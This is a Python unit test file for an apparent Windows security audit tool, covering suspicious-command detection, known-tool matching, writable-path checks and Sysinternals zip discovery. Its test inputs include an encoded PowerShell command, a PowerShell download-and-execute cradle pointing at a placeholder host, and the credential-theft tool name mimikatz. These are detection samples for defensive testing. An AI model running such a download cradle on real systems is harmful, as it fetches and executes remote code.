import unittest
import tempfile
import zipfile
from pathlib import Path

from win_security_audit import utils
from win_security_audit.checks import sysinternals


class UtilsTests(unittest.TestCase):
    def test_suspicious_command(self):
        self.assertTrue(utils.suspicious_command("powershell -EncodedCommand SQBFAFgA"))
        self.assertTrue(utils.suspicious_command("IEX (New-Object Net.WebClient).DownloadString('http://example')"))
        self.assertFalse(utils.suspicious_command("C:\\Windows\\System32\\notepad.exe"))

    def test_known_tools(self):
        self.assertEqual(utils.known_tool_name("C:\\Temp\\mimikatz.exe"), "mimikatz")
        self.assertIsNone(utils.known_tool_name("C:\\Windows\\System32\\notepad.exe"))

    def test_user_writable_path(self):
        self.assertTrue(utils.user_writable_path("C:\\Users\\a\\AppData\\Local\\Temp\\x.exe"))
        self.assertFalse(utils.user_writable_path("C:\\Windows\\System32\\svchost.exe"))

    def test_sysinternals_name_preferences(self):
        autoruns_names = sysinternals._preferred_tool_names("autorunsc")
        self.assertIn("autorunsc.exe", autoruns_names)
        self.assertIn("autorunsc64.exe", autoruns_names)
        self.assertEqual(sysinternals._preferred_tool_names("sigcheck"), ["sigcheck.exe"])

    def test_sysinternals_zip_discovery(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            zip_path = root / "Autoruns.zip"
            with zipfile.ZipFile(zip_path, "w") as archive:
                archive.writestr("Autoruns/autorunsc.exe", b"fake")
            found = sysinternals._find_sysinternals_tool([root], "autorunsc")
            self.assertIsNotNone(found)
            self.assertEqual(found.name.lower(), "autorunsc.exe")
            self.assertTrue(found.exists())


if __name__ == "__main__":
    unittest.main()
